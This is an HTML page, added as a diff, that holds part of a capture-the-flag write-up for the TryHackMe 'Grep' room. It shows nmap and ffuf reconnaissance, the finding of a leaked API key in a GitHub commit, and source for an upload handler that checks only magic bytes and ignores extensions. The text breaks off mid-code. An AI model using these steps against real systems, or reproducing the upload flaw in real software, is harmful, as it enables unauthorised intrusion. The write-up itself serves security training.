@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en-us"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+   <meta name="description" content="Link to challenge: Grep
+The task SuperSecure Corp, a fast-paced startup, is currently creating a blogging platform inviting security professionals to assess its security. The challenge involves using OSINT techniques to gather information from publicly accessible sources and exploit potential vulnerabilities in the web application.
+Q1: What is the API key that allows a user to register on the website? Navigating over to the website, which in my case is http://10.">  
+
+  <title>
+    
+      CTF writeup: Grep (TryHackMe)
+    
+  </title>
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/" />
+  
+  
+  
+  <link rel="stylesheet" href="/css/main.b12c3733372267cbda63d02325204117349ead0eacb1806f32adb662c98123160e854b5e890e82eb5fdec99928c27a1f6afabe09a486cf8c8663be4452ba7be1.css" integrity="sha512-sSw3MzciZ8vaY9AjJSBBFzSerQ6ssYBvMq22YsmBIxYOhUteiQ6C61/eyZkownofavq&#43;CaSGz4yGY75EUrp74Q==" />
+  
+</head>
+<body><div class="topnav-container">
+    <div class="nav-container">
+        <div class="theme-toggle">
+            <input type="checkbox" id="ChangeTheme"/>
+            <label for="ChangeTheme"> 
+                <svg class="moon" id="Moon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><polygon points="22 17 22 19 21 19 21 20 20 20 20 21 18 21 18 22 16 22 16 23 10 23 10 22 8 22 8 21 6 21 6 20 5 20 5 19 4 19 4 17 3 17 3 15 2 15 2 9 3 9 3 7 4 7 4 5 5 5 5 4 6 4 6 3 8 3 8 2 10 2 10 1 15 1 15 2 13 2 13 3 11 3 11 4 10 4 10 6 9 6 9 8 8 8 8 12 9 12 9 14 10 14 10 16 11 16 11 17 13 17 13 18 15 18 15 19 19 19 19 18 21 18 21 17 22 17"/></svg>
+                <svg class="sun" id="Sun" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><polygon points="17 10 17 14 16 14 16 15 15 15 15 16 14 16 14 17 10 17 10 16 9 16 9 15 8 15 8 14 7 14 7 10 8 10 8 9 9 9 9 8 10 8 10 7 14 7 14 8 15 8 15 9 16 9 16 10 17 10"/><path d="m21,11v-1h1v-1h1v-2h-3v-1h-2v-2h-1V1h-2v1h-1v1h-1v1h-2v-1h-1v-1h-1v-1h-2v3h-1v2h-2v1H1v2h1v1h1v1h1v2h-1v1h-1v1h-1v2h3v1h2v2h1v3h2v-1h1v-1h1v-1h2v1h1v1h1v1h2v-3h1v-2h2v-1h3v-2h-1v-1h-1v-1h-1v-2h1Zm-3,4h-1v1h-1v1h-1v1h-6v-1h-1v-1h-1v-1h-1v-6h1v-1h1v-1h1v-1h6v1h1v1h1v1h1v6Z"/></svg>
+            </label>
+        </div>
+        <ul id="menu">
+            <a href="/">
+                home
+            </a>
+            <a href="/posts/">
+                posts
+            </a>
+            <a href="/tags/">
+                tags
+            </a>
+        </ul>
+    </div>
+</div>
+
+<script>
+var checkbox = document.getElementById("ChangeTheme"); 
+
+
+if (sessionStorage.getItem("mode") == "dark") {
+  darkmode();
+} else {
+  nodark();
+}
+
+
+checkbox.addEventListener("change", function() {
+  
+  if (checkbox.checked) {
+    darkmode();
+  } else {
+    nodark();
+  }
+});
+
+
+function darkmode() {
+  document.body.classList.add("light");
+  checkbox.checked = true;
+  sessionStorage.setItem("mode", "dark"); 
+}
+
+
+function nodark() {
+  document.body.classList.remove("light");
+  checkbox.checked = false;
+  sessionStorage.setItem("mode", "light"); 
+}
+</script>
+<main class="page-content" aria-label="Content">
+            <div class="w">
+
+<article class="post-single">
+    <header class="post-header">
+    <span class="post-tags">
+        
+            <a href="http://localhost:1313/tags/ctf/">
+                 #ctf</a>&nbsp;
+        
+            <a href="http://localhost:1313/tags/writeup/">
+                 #writeup</a>&nbsp;
+        
+    </span>
+
+
+<h1 class="post-title">CTF writeup: Grep (TryHackMe)</h1>
+        <p class="post-meta">21.08.2023 :: 8 min read :: ogjojo&nbsp;/&nbsp;<a href="https://github.com/linutti/linutti.com/blob/main/content/posts/ctf-thm-grep.md" rel="noopener noreferrer" target="_blank">SUGGEST CHANGES</a>
+
+</p>
+    </header>
+    
+        <aside ><div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">table of contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#the-task" aria-label="The task">The task</a></li>
+                <li>
+                    <a href="#q1-what-is-the-api-key-that-allows-a-user-to-register-on-the-website" aria-label="Q1: What is the API key that allows a user to register on the website?">Q1: What is the API key that allows a user to register on the website?</a><ul>
+                        
+                <li>
+                    <a href="#a-ffe60ecaa8bba" aria-label="A: ffe60ecaa8bba***">A: <em>ffe60ecaa8bba***</em></a></li></ul>
+                </li>
+                <li>
+                    <a href="#q2-what-is-the-first-flag" aria-label="Q2: What is the first flag?">Q2: What is the first flag?</a><ul>
+                        
+                <li>
+                    <a href="#a-thm4ec" aria-label="A: THM{4ec***}">A: <em>THM{4ec***}</em></a></li></ul>
+                </li>
+                <li>
+                    <a href="#q3-what-is-the-email-of-the-admin-user" aria-label="Q3: What is the email of the &amp;ldquo;admin&amp;rdquo; user?">Q3: What is the email of the &ldquo;admin&rdquo; user?</a><ul>
+                        
+                <li>
+                    <a href="#a-admingrepthm" aria-label="A: admin@***.grep.thm">A: <em>admin@***.grep.thm</em></a></li></ul>
+                </li>
+                <li>
+                    <a href="#q4-what-is-the-host-name-of-the-web-application-that-allows-a-user-to-check-an-email-for-a-possible-password-leak" aria-label="Q4: What is the host name of the web application that allows a user to check an email for a possible password leak?">Q4: What is the host name of the web application that allows a user to check an email for a possible password leak?</a><ul>
+                        
+                <li>
+                    <a href="#a-grepthm" aria-label="A: ***.grep.thm">A: <em>***.grep.thm</em></a></li></ul>
+                </li>
+                <li>
+                    <a href="#q5-what-is-the-password-of-the-admin-user" aria-label="Q5: What is the password of the &amp;ldquo;admin&amp;rdquo; user?">Q5: What is the password of the &ldquo;admin&rdquo; user?</a><ul>
+                        
+                <li>
+                    <a href="#a-admin_" aria-label="A: admin_***!">A: <em>admin_***!</em></a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+        </aside>
+    <p>Link to challenge: <a href="https://tryhackme.com/room/greprtp">Grep</a></p>
+<h2 id="the-task">The task<a hidden class="anchor" aria-hidden="true" href="#the-task">#</a></h2>
+<blockquote>
+<p>SuperSecure Corp, a fast-paced startup, is currently creating a blogging platform inviting security professionals to assess its security. The challenge involves using OSINT techniques to gather information from publicly accessible sources and exploit potential vulnerabilities in the web application.</p>
+</blockquote>
+<h2 id="q1-what-is-the-api-key-that-allows-a-user-to-register-on-the-website">Q1: What is the API key that allows a user to register on the website?<a hidden class="anchor" aria-hidden="true" href="#q1-what-is-the-api-key-that-allows-a-user-to-register-on-the-website">#</a></h2>
+<p>Navigating over to the website, which in my case is <code>http://10.10.2.144/</code>, gives us the &ldquo;Apache2 Ubuntu Default Page&rdquo;. Cool, at least we know they&rsquo;re running Apache.</p>
+<p>Next, let&rsquo;s run an <em><strong>nmap</strong></em> scan and see what we get.</p>
+<p>Commands:</p>
+<div class="highlight"><pre tabindex="0" style="color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#e5c07b">export</span> <span style="color:#dcaeea">ip</span><span style="color:#54b1c7">=</span>10.10.2.144
+</span></span><span style="display:flex;"><span>nmap -A -oN nmap-<span style="color:#dcaeea">$ip</span>.out -p- <span style="color:#dcaeea">$ip</span>
+</span></span></code></pre></div><p>Output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 15:42 EDT
+</span></span><span style="display:flex;"><span>Nmap scan report for 10.10.2.144
+</span></span><span style="display:flex;"><span>Host is up (0.049s latency).
+</span></span><span style="display:flex;"><span>Not shown: 65531 closed tcp ports (conn-refused)
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE  VERSION
+</span></span><span style="display:flex;"><span>22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+</span></span><span style="display:flex;"><span>| ssh-hostkey: 
+</span></span><span style="display:flex;"><span>|   3072 59:d4:ee:f9:7a:62:ac:9a:6f:46:47:b7:30:c7:63:9f (RSA)
+</span></span><span style="display:flex;"><span>|   256 d4:b3:61:f1:56:31:90:75:80:b1:f0:d9:18:ba:43:30 (ECDSA)
+</span></span><span style="display:flex;"><span>|_  256 9b:2e:1a:a5:ff:1e:42:2e:12:0b:34:47:21:91:2d:3a (ED25519)
+</span></span><span style="display:flex;"><span>80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span style="display:flex;"><span>443/tcp   open  ssl/http Apache httpd 2.4.41
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-title: 403 Forbidden
+</span></span><span style="display:flex;"><span>| ssl-cert: Subject: commonName=grep.thm/organizationName=SearchME/stateOrProvinceName=Some-State/countryName=US
+</span></span><span style="display:flex;"><span>| Not valid before: 2023-06-14T13:03:09
+</span></span><span style="display:flex;"><span>|_Not valid after:  2024-06-13T13:03:09
+</span></span><span style="display:flex;"><span>|_ssl-date: TLS randomness does not represent time
+</span></span><span style="display:flex;"><span>| tls-alpn: 
+</span></span><span style="display:flex;"><span>|_  http/1.1
+</span></span><span style="display:flex;"><span>51337/tcp open  http     Apache httpd 2.4.41
+</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 (Ubuntu)
+</span></span><span style="display:flex;"><span>|_http-title: 400 Bad Request
+</span></span><span style="display:flex;"><span>Service Info: Host: ip-10-10-2-144.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap done: 1 IP address (1 host up) scanned in 64.43 seconds
+</span></span></code></pre></div><p>A few things to take note of:</p>
+<ul>
+<li>SSH is running in case we find login credentials</li>
+<li>Version of Apache is <strong>2.4.41</strong></li>
+<li>There&rsquo;s are Apache servers running on ports <strong>80</strong>, <strong>443</strong> and <strong>51337</strong></li>
+</ul>
+<p>Let&rsquo;s go have a look at what exactly is being served over on ports 443 and 51337.</p>
+<ul>
+<li>Port 443: we get a &ldquo;Forbidden&rdquo; message.</li>
+<li>Port 51337: same thing.</li>
+</ul>
+<p>Ok, next let&rsquo;s have a look at the self signed SSL certificates for the sites running on these ports. On port 443, we get a certificate for &ldquo;grep.thm&rdquo; and on port 51337 we get &ldquo;leakchecker.grep.thm&rdquo;.</p>
+<p>Screenshots of the certificates:</p>
+<p><img src="/pics/ctf-thm-grep/06.webp" alt="06"></p>
+<p><img src="/pics/ctf-thm-grep/07.webp" alt="07"></p>
+<p>Navigating to these domains at the moment gives us a &ldquo;Server Not Found&rdquo; error but we can fix that by adding these domains to our <code>/etc/hosts</code> file like so:</p>
+<div class="highlight"><pre tabindex="0" style="color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span># /etc/hosts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>10.10.2.144     grep.thm leakchecker.grep.thm
+</span></span></code></pre></div><p>BINGO! Accept the risk and we&rsquo;re in! Well, sort of anyway.</p>
+<p>grep.thm (port 443):</p>
+<p><img src="/pics/ctf-thm-grep/03.webp" alt="03"></p>
+<p>leakchecker.grep.thm (port 51337):</p>
+<p><img src="/pics/ctf-thm-grep/02.webp" alt="02"></p>
+<p>The question asks for the API key which allows a user to sign up. Let&rsquo;s navigate over to <code>grep.thm/public/html/register.php</code> and have a look.</p>
+<p>Trying to sign up gives this error:</p>
+<p><img src="/pics/ctf-thm-grep/04.webp" alt="04"></p>
+<p>Looking at the source code, there&rsquo;s a file called <code>register.js</code> which has an API key. This key is obviously not the API key we&rsquo;re looking for, so we need to find the correct one. Now, in the image below, you can see the <code>register.js</code> file sends this data to <code>../../api/register.php</code>. I&rsquo;m interested in the <code>api</code>.</p>
+<p><img src="/pics/ctf-thm-grep/05.webp" alt="05"></p>
+<p>Navigating to it gives just a blank page. Let&rsquo;s fire up <em><strong>ffuf</strong></em> and see what we get!</p>
+<p>Command:</p>
+<div class="highlight"><pre tabindex="0" style="color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -w /home/kali/.local/share/wordlists/SecLists/Discovery/Web-Content/big.txt -u https://grep.thm/api/FUZZ -e <span style="color:#63c381">&#34;.php&#34;</span>
+</span></span></code></pre></div><p>Output:</p>
+<div class="highlight"><pre tabindex="0" style="color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        /&#39;___\  /&#39;___\           /&#39;___\       
+</span></span><span style="display:flex;"><span>       /\ \__/ /\ \__/  __  __  /\ \__/       
+</span></span><span style="display:flex;"><span>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+</span></span><span style="display:flex;"><span>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+</span></span><span style="display:flex;"><span>         \ \_\   \ \_\  \ \____/  \ \_\       
+</span></span><span style="display:flex;"><span>          \/_/    \/_/   \/___/    \/_/       
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>       v2.0.0-dev
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> :: Method           : GET
+</span></span><span style="display:flex;"><span> :: URL              : https://grep.thm/api/FUZZ
+</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /home/kali/.local/share/wordlists/SecLists/Discovery/Web-Content/big.txt
+</span></span><span style="display:flex;"><span> :: Extensions       : .php 
+</span></span><span style="display:flex;"><span> :: Follow redirects : false
+</span></span><span style="display:flex;"><span> :: Calibration      : false
+</span></span><span style="display:flex;"><span> :: Timeout          : 10
+</span></span><span style="display:flex;"><span> :: Threads          : 40
+</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
+</span></span><span style="display:flex;"><span>________________________________________________
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 47ms]
+</span></span><span style="display:flex;"><span>    * FUZZ: .htaccess
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 46ms]
+</span></span><span style="display:flex;"><span>    * FUZZ: .htaccess.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 46ms]
+</span></span><span style="display:flex;"><span>    * FUZZ: .htpasswd
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 46ms]
+</span></span><span style="display:flex;"><span>    * FUZZ: .htpasswd.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Status: 200, Size: 34, Words: 3, Lines: 1, Duration: 136ms]
+</span></span><span style="display:flex;"><span>    * FUZZ: add_post.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 137ms]
+</span></span><span style="display:flex;"><span>    * FUZZ: config.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 181ms]
+</span></span><span style="display:flex;"><span>    * FUZZ: index.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Status: 200, Size: 42, Words: 4, Lines: 1, Duration: 110ms]
+</span></span><span style="display:flex;"><span>    * FUZZ: logout.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Status: 200, Size: 34, Words: 3, Lines: 1, Duration: 315ms]
+</span></span><span style="display:flex;"><span>    * FUZZ: login.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Status: 200, Size: 25, Words: 3, Lines: 1, Duration: 139ms]
+</span></span><span style="display:flex;"><span>    * FUZZ: posts.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Status: 200, Size: 38, Words: 5, Lines: 1, Duration: 47ms]
+</span></span><span style="display:flex;"><span>    * FUZZ: register.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 47ms]
+</span></span><span style="display:flex;"><span>    * FUZZ: uploads
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[Status: 200, Size: 39, Words: 3, Lines: 1, Duration: 134ms]
+</span></span><span style="display:flex;"><span>    * FUZZ: upload.php
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>:: Progress: [40952/40952] :: Job [1/1] :: 858 req/sec :: Duration: [0:03:59] :: Errors: 0 ::
+</span></span></code></pre></div><p>This is all well and good for later, most likely, but for now I cannot spot anything that would be of much use to us. Let&rsquo;s do some OSINT gathering.</p>
+<p>The SSL certificate for <code>grep.thm</code> had &ldquo;SearchMe&rdquo; as the organization.</p>
+<p>On Github, searching for &ldquo;searchme&rdquo; will give us a bunch of results. We can narrow the results down by selecting a language we want to filter by. In this case, the language we most likely want to filter by is PHP. Doing so yields these results:</p>
+<p><img src="/pics/ctf-thm-grep/08.webp" alt="08"></p>
+<p>What are we looking for? Let&rsquo;s recap:</p>
+<ul>
+<li>The app that SuperSecure Corp is building is a blogging platform, so perhaps something that might refer to a content management system</li>
+<li>As this challenge was created recently, the repository should also be relatively recently updated</li>
+<li>Something probably written in PHP</li>
+</ul>
+<p>Out of the results, this one sticks out to me:</p>
+<p><img src="/pics/ctf-thm-grep/09.webp" alt="09"></p>
+<p>Let&rsquo;s dig through it to see if we can find anything interesting.</p>
+<p>The file <code>searchmecms/api/register.php</code> contains the same header name as we saw in that <code>javascript</code> file before: <code>X-THM-API-KEY</code>. Now let&rsquo;s look at the commits if we can find the actual key!</p>
+<p><img src="/pics/ctf-thm-grep/10.webp" alt="10"></p>
+<p>There it is, in commit <code>db11421</code>.</p>
+<h3 id="a-ffe60ecaa8bba">A: <em>ffe60ecaa8bba***</em><a hidden class="anchor" aria-hidden="true" href="#a-ffe60ecaa8bba">#</a></h3>
+<h2 id="q2-what-is-the-first-flag">Q2: What is the first flag?<a hidden class="anchor" aria-hidden="true" href="#q2-what-is-the-first-flag">#</a></h2>
+<p>Now that we have the API key, we can go ahead and create a user.</p>
+<p>I&rsquo;ll be using Burp Suite for this. First, capture the POST request from <code>https://grep.thm/public/html/register.php</code>, then by editing <code>X-Thm-Api-Key</code> value to match what we found earlier, we should be able to register a new user.</p>
+<p><img src="/pics/ctf-thm-grep/11.webp" alt="11"></p>
+<p>Aaand success!</p>
+<p><img src="/pics/ctf-thm-grep/12.webp" alt="12"></p>
+<p>Loggin in gives us the first flag!🚩</p>
+<h3 id="a-thm4ec">A: <em>THM{4ec***}</em><a hidden class="anchor" aria-hidden="true" href="#a-thm4ec">#</a></h3>
+<h2 id="q3-what-is-the-email-of-the-admin-user">Q3: What is the email of the &ldquo;admin&rdquo; user?<a hidden class="anchor" aria-hidden="true" href="#q3-what-is-the-email-of-the-admin-user">#</a></h2>
+<p>Looking at the dashboard, we can only see posts and that admin has posted 2 times. Not very useful when we need to find the admin user&rsquo;s email address.</p>
+<p>I think it&rsquo;s reverse shell time!</p>
+<p>Looking the the <code>upload.php</code> file in the Github repository we can see detailed information on what kind of files are allowed. This is very useful information, thank you very much!</p>
+<div class="highlight"><pre tabindex="0" style="color:#b0c4de;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#54b1c7">&lt;?</span><span style="color:#aa89ea">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#aa89ea">session_start</span><span style="color:#abb2bf">();</span>
+</span></span><span style="display:flex;"><span><span style="color:#76a9f9">require</span> <span style="color:#98c379">&#39;config.php&#39;</span><span style="color:#abb2bf">;</span>
+</span></span><span style="display:flex;"><span><span style="color:#dcaeea">$uploadPath</span> <span style="color:#54b1c7">=</span> <span style="color:#98c379">&#39;uploads/&#39;</span><span style="color:#abb2bf">;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#76a9f9">function</span> <span style="color:#00b1f7">checkMagicBytes</span><span style="color:#abb2bf">(</span><span style="color:#dcaeea">$fileTmpPath</span><span style="color:#abb2bf">,</span> <span style="color:#dcaeea">$validMagicBytes</span><span style="color:#abb2bf">)</span> <span style="color:#abb2bf">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dcaeea">$fileMagicBytes</span> <span style="color:#54b1c7">=</span> <span style="color:#aa89ea">file_get_contents</span><span style="color:#abb2bf">(</span><span style="color:#dcaeea">$fileTmpPath</span><span style="color:#abb2bf">,</span> <span style="color:#76a9f9">false</span><span style="color:#abb2bf">,</span> <span style="color:#76a9f9">null</span><span style="color:#abb2bf">,</span> <span style="color:#d19a66">0</span><span style="color:#abb2bf">,</span> <span style="color:#d19a66">4</span><span style="color:#abb2bf">);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#76a9f9">return</span> <span style="color:#aa89ea">in_array</span><span style="color:#abb2bf">(</span><span style="color:#aa89ea">bin2hex</span><span style="color:#abb2bf">(</span><span style="color:#dcaeea">$fileMagicBytes</span><span style="color:#abb2bf">),</span> <span style="color:#dcaeea">$validMagicBytes</span><span style="color:#abb2bf">);</span>
+</span></span><span style="display:flex;"><span><span style="color:#abb2bf">}</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#dcaeea">$allowedExtensions</span> <span style="color:#54b1c7">=</span> <span style="color:#abb2bf">[</span><span style="color:#98c379">&#39;jpg&#39;</span><span style="color:#abb2bf">,</span> <span style="color:#98c379">&#39;jpeg&#39;</span><span style="color:#abb2bf">,</span> <span style="color:#98c379">&#39;png&#39;</span><span style="color:#abb2bf">,</span> <span style="color:#98c379">&#39;bmp&#39;</span><span style="color:#abb2bf">];</span>
+</span></span><span style="display:flex;"><span><span style="color:#dcaeea">$validMagicBytes</span> <span style="color:#54b1c7">=</span> <span style="color:#abb2bf">[</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#98c379">&#39;jpg&#39;</span> <span style="color:#54b1c7">=&gt;</span> <span style="color:#98c379">&#39;ffd8ffe0&#39;</span><span style="color:#abb2bf">,</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#98c379">&#39;png&#39;</span> <span style="color:#54b1c7">=&gt;</span> <span style="color:#98c379">&#39;89504e47&#39;</span><span style="color:#abb2bf">,</span> 
+</span></span><span style="display:flex;"><span>    <span style="color:#98c379">&#39;bmp&#39;</span> <span style="color:#54b1c7">=&gt;</span> <span style="color:#98c379">&#39;424d&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#abb2bf">];</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#76a9f9">if</span> <span style="color:#abb2bf">(</span><span style="color:#dcaeea">$_SERVER</span><span style="color:#abb2bf">[</span><span style="color:#98c379">&#39;REQUEST_METHOD&#39;</span><span style="color:#abb2bf">]</span> <span style="color:#54b1c7">===</span> <span style="color:#98c379">&#39;POST&#39;</span><span style="color:#abb2bf">)</span> <span style="color:#abb2bf">{</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#76a9f9">if</span> <span style="color:#abb2bf">(</span><span style="color:#aa89ea">isset</span><span style="color:#abb2bf">(</span><span style="color:#dcaeea">$_SESSION</span><span style="color:#abb2bf">[</span><span style="color:#98c379">&#39;username&#39;</span><span style="color:#abb2bf">]))</span> <span style="color:#abb2bf">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#76a9f9">if</span> <span style="color:#abb2bf">(</span><span style="color:#aa89ea">isset</span><span style="color:#abb2bf">(</span><span style="color:#dcaeea">$_FILES</span><span style="color:#abb2bf">[</span><span style="color:#98c379">&#39;file&#39;</span><span style="color:#abb2bf">]))</span> <span style="color:#abb2bf">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#dcaeea">$file</span> <span style="color:#54b1c7">=</span> <span style="color:#dcaeea">$_FILES</span><span style="color:#abb2bf">[</span><span style="color:#98c379">&#39;file&#39;</span><span style="color:#abb2bf">];</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#dcaeea">$fileName</span> <span style="color:#54b1c7">=</span> <span style="color:#dcaeea">$file</span><span style="color:#abb2bf">[</span><span style="color:#98c379">&#39;name&#39;</span><span style="color:#abb2bf">];</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#dcaeea">$fileTmpPath</span> <span style="color:#54b1c7">=</span> <span style="color:#dcaeea">$file</span><span style="color:#abb2bf">[</span><span style="color:#98c379">&#39;tmp_name&#39;</span><span style="color:#abb2bf">];</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#dcaeea">$fileExtension</span> <span style="color:#54b1c7">=</span> <span style="color:#aa89ea">strtolower</span><span style="color:#abb2bf">(</span><span style="color:#aa89ea">pathinfo</span><span style="color:#abb2bf">(</span><span style="color:#dcaeea">$fileName</span><span style="color:#abb2bf">,</span> <span style="color:#aa89ea">PATHINFO_EXTENSION</span><span style="color:#abb2bf">));</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#76a9f9">if</span> <span style="color:#abb2bf">(</span><span style="color:#aa89ea">checkMagicBytes</span><span style="color:#abb2bf">(</span><span style="color:#dcaeea">$fileTmpPath</span><span style="color:#abb2bf">,</span> <span style="color:#dcaeea">$validMagicBytes</span><span style="color:#abb2bf">))</span> <span style="color:#abb2bf">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#dcaeea">$uploadDestination</span> <span style="color:#54b1c7">=</span> <span style="color:#dcaeea">$uploadPath</span> <span style="color:#54b1c7">.</span> <span style="color:#dcaeea">$fileName</span><span style="color:#abb2bf">;</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#aa89ea">move_uploaded_file</span><span style="color:#abb2bf">(</span><span style="color:#dcaeea">$fileTmpPath</span><span style="color:#abb2bf">,</span> <span style="color:#dcaeea">$uploadDestination</span><span style="color:#abb2bf">);</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>                <span style="color:#76a9f9">echo</span> <span style="color:#aa89ea">json_encode</span><span style="color:#abb2bf">([</span><span style="color:#98c379">&#39;message&#39;</span> <span style="color:#54b1c7">=&gt;</span> <span style="color:#98c379">&#39;File uploaded successfully.&#39;</span><span style="color:#abb2bf">]);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#abb2bf">}</span> <span style="color:#76a9f9">else</span> <span style="color:#abb2bf">{</span>
+</span></span><span style="display:flex;"><span>                <span style="color:#76a9f9">echo</span> <span style="color:#aa89ea">json_encode</span><span style="color:#abb2bf">([</span><span style="color:#98c379">&#39;error&#39;</span> <span style="color:#54b1c7">=&gt;</span> <span style="color:#98c379">&#39;Invalid file type. Only JPG, JPEG, PNG, and BMP files are allowed.&#39;</span><span style="color:#abb2bf">]);</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#abb2bf">}</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#abb2bf">}</span> <span style="color:#76a9f9">else</span> <span style="color:#abb2bf">{</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#76a9f9">echo</span> <span style="color:#aa89ea">json_encode</span><span style="color:#abb2bf">([</span><span style="color:#98c379">&#39;error&#39;</span> <span style="color:#54b1c7">=&gt;</span> <span style="color:#98c379">&#39;No file uploaded.&#39;</span><span style="color:#abb2bf">]);</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#abb2bf">}</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#abb2bf">}</span> <span style="color:#76a9f9">else</span> <span style="color:#abb2bf">{</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#76a9f9">echo</span> <span style="color:#aa89ea">json_encode</span><span style="color:#abb2bf">([</span><span style="color:#98c379">&#39;error&#39;</span> <span style="color:#54b1c7">=&gt;</span> <span style="color:#98c379">&#39;User not logged in.&#39;</span><span style="color:#abb2bf">]);</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#abb2bf">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#abb2bf">}</span> <span style="color:#76a9f9">else</span> <span style="color:#abb2bf">{</span>
